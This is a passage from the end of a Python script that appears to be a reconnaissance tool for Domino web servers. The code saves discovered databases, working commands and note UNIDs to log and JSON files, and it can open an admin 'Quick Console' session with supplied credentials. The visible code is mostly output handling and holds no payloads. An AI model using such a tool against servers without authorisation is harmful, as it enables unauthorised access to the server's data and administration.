                    # Strip color codes for logfile
                    f.write(Style.RESET_ALL + re.sub(r"\x1b\[[0-9;]*m", "", line) + "\n")

                if unid_map:
                    f.write("\n# UNIDs\n")
                    for db_path, entries in unid_map.items():
                        for e in entries:
                            f.write(
                                f"{db_path} {e['unid']} {e['noteid']} {e['source']}\n"
                            )

            # Separate .unids file
            if unid_map:
                with open(args.logfile + ".unids", "w") as uf:
                    for db_path, entries in unid_map.items():
                        for e in entries:
                            uf.write(
                                f"{db_path} {e['unid']} {e['noteid']} {e['source']}\n"
                            )

            # Commands file
            if working_commands:
                with open(args.logfile + ".cmds", "w") as cf:
                    for db_path, cmds in working_commands.items():
                        cf.write(
                            f"{db_path}: {', '.join(sorted(set(cmds)))}\n"
                        )

            print(f"\n{Fore.GREEN}[+] Output saved to {args.logfile}")

        # JSON output
        if args.json_out:
            data = {
                "target": args.host,
                "protocol": protocol,
                "port": port,
                "databases": [],
            }
            for db_path, info in db_registry.items():
                data["databases"].append(
                    {
                        "path": db_path,
                        "url": info["url"],
                        "status": info["status"],
                        "working_commands": sorted(set(working_commands.get(db_path, []))),
                        "unids": unid_map.get(db_path, []),
                    }
                )
            with open(args.json_out, "w") as jf:
                json.dump(data, jf, indent=2)
            print(f"{Fore.GREEN}[+] JSON output saved to {args.json_out}")

    # ACTION 5: Quick Console (interactive)
    if args.quick_console:
        if not username or not password:
            print(f"{Fore.RED}[!] Quick Console requires admin authentication (-u username:password)")
        else:
            # Authenticate first
            if login(session, base_url, username, password, args.proxy):
                print(f"{Fore.GREEN}[+] Authenticated as {username}")
                quick_console(session, base_url, username, password, args.proxy)
            else:
                print(f"{Fore.RED}[-] Authentication failed")

    print(f"\n{Fore.CYAN}[*] Done!")


if __name__ == "__main__":
    main()

